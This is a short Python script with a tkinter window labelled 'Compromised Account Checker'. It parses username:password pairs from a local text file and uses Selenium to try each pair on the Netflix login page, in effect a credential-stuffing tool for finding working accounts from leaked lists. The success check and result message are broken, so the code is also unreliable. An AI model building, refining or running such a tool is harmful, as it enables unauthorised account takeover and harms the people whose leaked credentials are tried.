# -*- coding: utf-8 -*-
"""
@author: Allan

"""

from selenium import webdriver
import time
from tkinter import *

root = Tk() 
text = Text(root)
root.geometry("800x1000") 

position = -1
iterator = 0
lineIterator = 0 
newUsername = ""
newPassword = ""
userCount = 0 
infoDict = {}
i = 0
j = 1
f = open("C:/Users/Allan/Desktop/test.txt", "r")

listofInfo = list(f)

noOfLines = len(listofInfo) - 1

for i in range(noOfLines):
    position = -1
    iterator = 0
    newUsername = ""
    newPassword = ""
    for letters in listofInfo[lineIterator]:
        position+=1
        if(letters == ":"):
            for userLetters in range(position):
                newUsername = newUsername + str(listofInfo[lineIterator][iterator])
                iterator += 1
            userCount +=1 
            iterator = 0
            infoDict["Username" + str(userCount)] = str(newUsername)
            for passLetters in range( (len(listofInfo[lineIterator]) - 1) - position - 1 ):
                iterator += 1
                newPassword = newPassword + str(listofInfo[lineIterator][ (position) + iterator ])
            infoDict["Password" + str(userCount)] = str(newPassword)
            lineIterator +=1 
            

titleLabel = Label(root, text="Compromised Account Checker", font="Times 16").place(anchor = 'center', x=400, y=15)
subtitleLablel = Label(root, text="Via .TXT Files ", font="Times 10").place(anchor = 'center', x= 400, y=33) 
subtitleLablel = Label(root, text="Ver 1", font="Times 10").place(anchor = 'center', x= 400, y=51) 

    
def clickToStart():
    global j
    j = 1
    url = "https://www.netflix.com/login"

    driver = webdriver.Chrome(r"C:\Users\allan\Desktop\chromedriver.exe")
    driver.get(url)

    for lines in range(noOfLines):
        UserName = infoDict.setdefault("Username" + str(j))
        Password = infoDict.setdefault("Password" + str(j))
        j+=1
        time.sleep(1)
        driver.find_element_by_id("id_userLoginId").clear()
        driver.find_element_by_id("id_userLoginId").send_keys(UserName)
        time.sleep(3)
        driver.find_element_by_id("id_password").clear()
        driver.find_element_by_id("id_password").send_keys(Password)
        driver.find_element_by_class_name("login-button").click()
        
        if( driver.find_element_by_id("id_password") == None):
            printNewMessage = Label(root, text = ( displayMessage), font ="Times 12" ).place(x = 375, y = 200)

root.resizable(False, False)
newName = Button(root, text = "Start", padx=200, font="Times 14", command= clickToStart ).place(x =360, y = 860, height = 40, width = 110)

    
displayMessage = "compromised account found at "  + str(j)
root.mainloop()  






    